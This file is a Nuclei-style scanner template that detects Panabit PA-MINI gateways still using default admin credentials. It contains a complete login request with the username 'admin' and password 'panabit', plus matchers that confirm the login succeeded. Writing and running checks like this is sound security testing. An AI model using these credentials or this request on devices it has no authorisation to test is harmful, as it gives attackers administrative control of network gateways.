id: panabit-pa-mini-default-password

info:
  name: Panabit PA-MINI Gateway Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The PA-MINI series desktop application gateway is a high-performance, high-availability, feature-rich export integrated optimization device specially provided by Panabit for small enterprise networks. This vulnerability allows attackers to gain administrative authority using default credentials.
  tags: default-password, admin-login

http:
  - raw:
      - |
        POST /login/userverify.cgi HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
        Upgrade-Insecure-Requests: 1
        Content-Type: multipart/form-data; boundary=---------------------------2488676342869010711951153348
        Referer: {{BaseURL}}/login/login.htm
        Origin: {{BaseURL}}
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1

        -----------------------------2488676342869010711951153348
        Content-Disposition: form-data; name="username"

        admin
        -----------------------------2488676342869010711951153348
        Content-Disposition: form-data; name="password"

        panabit
        -----------------------------2488676342869010711951153348--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<META HTTP-EQUIV=REFRESH CONTENT=\"0;URL=/index.htm\">"
          - "urn:schemas-microsoft-com:vml"
